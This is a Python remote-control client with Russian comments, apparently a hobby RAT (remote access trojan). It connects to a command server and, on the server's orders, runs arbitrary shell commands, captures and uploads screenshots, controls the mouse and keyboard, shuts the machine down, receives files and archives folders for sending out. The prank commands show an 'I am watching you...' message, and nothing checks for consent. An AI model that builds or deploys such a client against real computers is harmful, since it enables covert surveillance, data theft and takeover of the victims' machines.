import io
import locale
import os
import random
import re
import shutil
import socket
import struct
import subprocess
import threading
import time

import jpysocket
import keyboard
import mouse
import pyautogui

# TODO: проверки на ошибки выполнения (что если отключить интернет?)
# TODO: ломаем сервер как можем) *а это мы можем*

server = socket.socket()  # создаем объект сокета
uni_id = 0


def cmd_thread(messageText):
    global command_multi_line
    command_text = messageText.split('cmd ')[1]
    print(f'Command text is: {command_text}')
    append = True
    if command_text == 'clear':
        command_multi_line = ''
        result = 'Cmd session cleared'
    elif command_text == 'cmdsession':
        if command_multi_line == '':
            result = 'Cmd session command is empty!'
        else:
            result = f'Cmd session command is:\n{command_multi_line}'
    else:
        to_execute = command_multi_line
        if ';' in command_text:  # multiple commands handling
            for c in command_text.split(';'):
                to_execute += ' & ' + c
        elif 'cmd cur ' in messageText:
            to_execute += ' & ' + messageText.split('cmd cur ')[1]
            append = False
        else:
            if command_multi_line.strip() == '':
                to_execute = command_text
            else:
                to_execute += ' & ' + command_text
        print(f'Command is: {to_execute}')

        if 'cd' in to_execute:
            working_dir = to_execute.split('cd')[1].split('&')[0]
        else:
            working_dir = os.curdir
        working_dir = working_dir.strip()
        print(f'Working dir: {working_dir}')
        output = ''
        process = subprocess.Popen(to_execute, cwd=working_dir, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT)
        for line in process.stdout.readlines():
            line = line.strip()
            if line:
                output += line.decode('cp866') + '\n'
        if append:
            command_multi_line = to_execute
        result = f'Output for command:\n{command_text} \nIs:\n {output}'

    sendData(server, result)


def screenshot():
    screen = pyautogui.screenshot()
    buf = io.BytesIO()
    screen.save(buf, format='JPEG')
    print(buf.getvalue())
    sendByteFile(buf.getvalue(), 'screen6.jpg')
    # screen.save('screenshot.png')


def handle_command(message):
    result = 'unknown command'

    command_regex = r'(\d+\$.+\$.+)'
    system_command_regex = r'(SYS\$.+)'

    args = message.split('$')
    command_id = ''
    command = ''
    command_args = ''
    if message == 'FILE_INCOMING':
        print('WAITING FOR A FILE...')
        name = readFile()
        print('GOT A FILE!!!')
        result = 'File read successfully: ' + name
    elif re.fullmatch(command_regex, message):
        command_id = int(args[0])
        command = args[1].lower()
        command_args = args[2]
        if command == 'left':
            mouse.click("left")
            result = 'Mouse left clicked'
        elif command == 'right':
            mouse.click("right")
            result = 'Mouse right clicked'
        elif command == 'lang':
            keyboard.press('win')
            keyboard.press('space')
            keyboard.release('win')
            keyboard.release('space')
            result = 'Switched languages'
        elif command == 'switch':
            if command_args.isdigit():
                for i in range(int(command_args)):
                    keyboard.press("alt")
                    keyboard.press("tab")
                    keyboard.release("alt")
                    keyboard.release("tab")
            else:
                keyboard.press("alt")
                keyboard.press("tab")
                keyboard.release("alt")
                keyboard.release("tab")
            result = 'Window switched'
        elif command == 'close':
            keyboard.press("alt")
            keyboard.press("f4")
            keyboard.release("alt")
            keyboard.release("f4")
            result = 'Current window closed'
        elif command == 'hide':
            keyboard.press("win")
            keyboard.press("m")
            keyboard.release("win")
            keyboard.release("m")
            result = 'Hided all windows'
        elif command == 'shutdown':
            sendData(server, "Shutting down.. BYE)")
            os.system("shutdown -p")
            result = 'Shutting down'
        elif command == 'mystify' or command == 'anim':
            os.system("Mystify.scr -a")
            result = 'Mystify animation started'
        elif command == 'watching' or command == 'hacked':
            os.system("start cmd")
            time.sleep(0.1)
            keyboard.write("I am watching you...", 0.1)
            time.sleep(1.0)
            keyboard.press("alt")
            keyboard.press("f4")
            keyboard.release("alt")
            keyboard.release("f4")
            result = 'Watching command line shown'
        elif command.startswith('cmd'):
            cmdThread = threading.Thread(target=cmd_thread, args=(command, socket))
            cmdThread.start()
            result = 'Executed, waiting...'
        elif command == 'matrix':
            os.startfile("matrix.bat")
            time.sleep(0.1)
            keyboard.press("alt")
            keyboard.press("enter")
            keyboard.release("alt")
            keyboard.release("enter")
            result = 'Matrix shown'
        elif command.startswith('press'):
            key = command_args
            try:
                keyboard.press(key)
                keyboard.release(key)
                result = f'Key {key} typed'
            except ValueError as error:
                result = f'Failed to press{key}: error was: \n{error}'
        elif command.startswith('alert'):
            command_text = command_args
            print(command_text.split())
            print(command_text.split().__len__())
            if command_text.split().__len__() != 3:
                result = 'Wrong format: should be:\nalert title, text, button_text'
            else:
                title = command_text.split()[0]
                text = command_text.split()[1]
                button_text = command_text.split()[2]
                # TODO: ALERT C SHIT
                result = f'Alert window with title: {title}, text: {text} and button text: {button_text} was shown'
        elif command.startswith('type'):
            phrase = command_args
            if phrase[0] == command:
                result = 'Failed: ENTER, what do u want to type!'
            else:
                time.sleep(0.2)
                try:
                    keyboard.write(phrase)
                    result = f'Phrase {phrase} type successfully'
                except ValueError as error:
                    result = f'Failed to type{phrase}: error was: \n{error}'
                    print(error)
        elif command.startswith('scroll'):
            if not command_args.isdigit():
                result = 'Failed: ENTER, how many do u want to scroll!'
            else:
                direction = 0
                try:
                    direction = int(command_args)
                    mouse.wheel(int(direction))
                    result = f'Mouse scrolled {int(direction)} units {"down" if direction < 0 else "up"}'
                except ValueError as error:
                    result = f"Failed to scroll {direction} units with error:\n{error}"
        elif command.startswith('move'):
            if not command_args.isdigit():
                result = 'Failed: Were to move the mouse? (2 numbers)!'
            elif 2 <= command_args.split().__len__() <= 3:
                x, y = 0, 0
                try:
                    x = int(command_args.split()[0])
                    y = int(command_args.split()[1])
                    absolute = command_args.split().__len__() == 3
                    if absolute:
                        pyautogui.moveTo(x, y)
                    else:
                        pyautogui.moveRel(x, y)
                    result = f'Mouse {f"moved by ({x}, {y}) " if not absolute else "moved "}to ({pyautogui.position().x}, {pyautogui.position().y})'
                except ValueError as error:
                    result = f'Failed to move mouse cursor to ({x}, {y}) with error:\n{error}'
            else:
                result = 'Failed: Were to move the mouse? (2 numbers)!'
        elif command.startswith('drag'):
            # TODO: FIX THIS SHIT
            if command.split('drag ').__len__() == 1:
                result = 'Failed: Were to drag the mouse? (2 numbers)!'
            elif command.split('drag ').__len__() == 2 and 2 <= command.split('drag ')[1].split().__len__() <= 3:
                x, y = 0, 0
                try:
                    x = int(command.split('drag ')[1].split()[0])
                    y = int(command.split('drag ')[1].split()[1])
                    absolute = command.split('drag ')[1].split().__len__() == 3
                    if absolute:
                        pyautogui.dragTo(x, y)
                    else:
                        pyautogui.dragRel(x, y)
                    result = f'Mouse {f"dragged by ({x}, {y}) " if not absolute else "dragged "}to ({pyautogui.position().x}, {pyautogui.position().y})'
                except ValueError as error:
                    result = f'Failed to drag mouse cursor to ({x}, {y}) with error:\n{error}'
            else:
                result = 'Failed: Were to drag the mouse? (2 numbers)!'
        elif command == 'mouse':
            result = f'Mouse position on screen is:  ({pyautogui.position().x}, {pyautogui.position().y})'
        elif command == 'screen':
            screenshot()
            # TODO: FILE SENDING
            # socket.send_photo(chatId, photo=open('screenshot.png', 'rb'))
        elif command.startswith('getfile'):
            file_name = command_args
            if ':\\' in file_name:  # absolute path
                path = file_name
            else:  # relative path
                path = os.curdir + '/' + file_name
            try:
                file = open(path, 'rb')
                # TODO: SEND FILES
                # socket.send_document(chatId, file, caption=f'{file_name}:', filename=file.name)
                file.close()
            except FileNotFoundError as error:
                result = f'Failed to send {file_name} with error:\n{error}'
        elif command.startswith('getfolder'):
            if command_args == '':
                print(f'making archive for {os.path.abspath(os.curdir)}')
                shutil.make_archive('../FOLDER_SAVE', 'zip', os.curdir)
                file = open("../FOLDER_SAVE.zip", 'rb')
                path = os.path.abspath('../FOLDER_SAVE.zip')
                print(f'path is: {path}')
                print('saved')
                print(f'size: {os.path.getsize(path)}')
                print('sending to bot')
                # TODO: FILE SENDING
                # socket.send_document(chatId, file, caption=f'{os.curdir}', filename=file.name)
                file.close()
    elif re.fullmatch(system_command_regex, message):
        if command == 'shutdown':
            sendData(server, 'C$' + str(command_id) + '$SHUTTING DOWN! MUHAHA')
            # TODO: RECONNECT TO SERVER (maybe, server got down and needs to restart)
            exit(0)
        if command == 'disconnect':
            exit(0)

    to_send = "C$" + str(uni_id) + "$" + str(command_id) + "$" + result
    return to_send


class Thread1(threading.Thread):  # потоки через класс тк threading.Thread(target=...) не работает
    def run(self):
        while True:
            command = readData(server)
            to_send = handle_command(command)
            sendData(server, to_send)


def sendData(soc, msg):
    soc.send(jpysocket.jpyencode(msg))


def readData(soc):
    return jpysocket.jpydecode(soc.recv(8192))


def sendFile(filename, savename):
    sendData(server, "C$FILE$" + savename + "$" + str(os.path.getsize(filename)))
    file = open(filename, 'rb')
    buffer = file.read(4096)
    while buffer:
        server.send(buffer)
        buffer = file.read(4096)

    file.close()


def readFile():
    filename = readData(server)
    file = open(filename, 'wb')
    buf = server.recv(8)
    size = struct.unpack('>q', buf)[0]

    if size < 4096:
        buffer = server.recv(4096)
        file.write(buffer)
    else:
        while size > 0:
            buffer = server.recv(4096)
            file.write(buffer)
            size -= buffer.__len__()
    file.close()
    return filename


def sendByteFile(bsend, savename):
    size = bsend.__len__()
    sendData(server, "C$FILE$" + savename + "$" + str(size))
    index = 0
    if size < 4096:
        # send all in once
        server.send(bsend)
    else:
        while index + 4096 < size:
            # send data
            buffer = bsend[index:index + 4096]
            server.send(buffer)
            index += 4096
        if index < size:
            # send remaining if left
            buffer = bsend[index:size]
            server.send(buffer)


def main() -> None:
    IP = "localhost"  # ip и порт
    PORT = 26780
    print("trying to connect to server...")
    server.connect((IP, PORT))  # подключаемся к серверу
    print(f"Successfully connected to {IP}:{PORT}. (Client -> Server)")
    i = random.randint(1, 32000)
    global uni_id

    uni_id = i

    s = "C$" + str(uni_id)
    sendData(server, s)

    data = readData(server)
    if "LOGIN$CONNECT" not in data:
        while "LOGIN$CONNECT" not in data:
            i = random.randint(1, 32000)
            uni_id = -i
            s = "C$" + str(uni_id)
            sendData(server, s)
            data = readData(server)
            print(f"data: {data}")

        f = open("id.txt", "w")
        f.write(str(-uni_id))
        f.close()
    else:
        print("durak?")

    uni_id = abs(uni_id)

    # screenshot()
    # sendFile('screenshot.png', 'screen1.png')
    # readFile()

    t1 = Thread1()  # запускаем обмен данными с сервером
    t1.start()


if __name__ == '__main__':
    main()
